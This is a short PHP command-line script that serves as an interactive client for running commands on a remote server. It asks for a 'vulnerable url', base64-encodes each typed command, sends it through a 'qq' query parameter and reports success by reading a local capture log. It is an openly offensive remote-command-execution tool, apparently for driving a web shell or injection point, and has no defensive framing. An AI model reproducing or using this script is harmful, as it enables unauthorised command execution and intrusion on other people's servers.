<?php

error_reporting(E_PARSE | E_ERROR);

if (!defined('t_ip')){
    define('t_ip', trim(readline('vulnerable url? -> ')));
}
while (true){
    $command = trim(readline("command: -> "));
    $f = explode('\n', file_get_contents(t_ip.'&qq='. base64_encode($command)));
    if (!is_null(file(getenv('HOME').'/capture_log.log')[0])){
        system('clear');
        echo "\033[0;36m$command appears to have been successful!\033[0m".PHP_EOL;
        foreach (file(getenv('HOME').'/capture_log.log') as $line){
            echo "\033[0;36m ".$line." \033[0m ";
        }
        echo PHP_EOL;
    }else{
        system('clear');
        echo "\033[0;36m$command appears to have not been successful!\033[0m".PHP_EOL;
        echo "Sorry, looks like that command didn't work.".PHP_EOL;
    }
}